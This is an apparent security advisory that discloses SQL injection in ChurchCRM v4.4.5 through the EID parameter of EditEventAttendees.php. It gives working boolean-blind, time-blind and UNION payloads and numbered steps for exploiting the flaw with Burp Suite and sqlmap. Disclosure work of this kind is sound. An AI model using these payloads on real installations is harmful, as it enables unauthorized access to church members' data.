# ChurchCRM-v4.4.5_Vuln1
ChurchCRM v4.4.5 has SQL Injection Vulnerabilities at EditEventAttendees.php

### Vulnerability Explanation:
ChurchCRM version 4.4.5 allows its users to add new events such as church services, Sunday school. Once an event has been created it can also be view attendees through the Church Event page, Church Event Editor. The EID parameter of the EditEventAttendees.php can be abused for injecting arbitrary SQL queries.

### Affected: 
1. https://{IP_Address}/churchcrm/ListEvents.php

2. POST /churchcrm/EditEventAttendees.php HTTP/1.1

### Payload :

Parameter: EID (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: EID=(SELECT (CASE WHEN (9661=9661) THEN 1 ELSE (SELECT 6727 UNION SELECT 7189) END))&EName=2022-07-03-Church Service&EDesc=&EDate=July 03 2022 10:30 am&Action=Attendees(0)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: EID=1 AND (SELECT 4311 FROM (SELECT(SLEEP(5)))kQmS)&EName=2022-07-03-Church Service&EDesc=&EDate=July 03 2022 10:30 am&Action=Attendees(0)

    Type: UNION query
    Title: MySQL UNION query (random number) - 2 columns
    Payload: EID=1 UNION ALL SELECT 3410,CONCAT(0x7176627671,0x6857594554466f6748796f4e61544c594a4c62527751794d4c4453504f4b45486b5358464541776c,0x71626a6271)#&EName=2022-07-03-Church Service&EDesc=&EDate=July 03 2022 10:30 am&Action=Attendees(0)

### Tested on: 
1. ChurchCRM v4.4.5 (https://github.com/ChurchCRM/CRM/releases/tag/4.4.5)

2. Google Chrome Version 102.0.5005.115 (Official Build) (x86_64)

3. sqlmap version 1.6.4 stable

### Steps to attack:
1. Login with username and password.
2. Select the "List Church Events" tab.
3. If you don't have any events, you may add them by clicking the "Add New Events" button.
4. Create Church Events such as church services and Sunday school.
5. When you save the event, it will appear on the Listing All Church Events page.
6. Intercept request by using Burp Suite.
7. When you click on Attendees, you will be sent to the Church Event Editor page.
8. Returning to Burp Suite, at /churchcrm/EditEventAttendees.php, right-click and select "Copy to file."
9. Send the request file to Kali Linux and use sqlmap with it.
10. SQL Injection vulnerability discovered through EID

### Author:
Grim The Ripper Team by SOSECURE Thailand
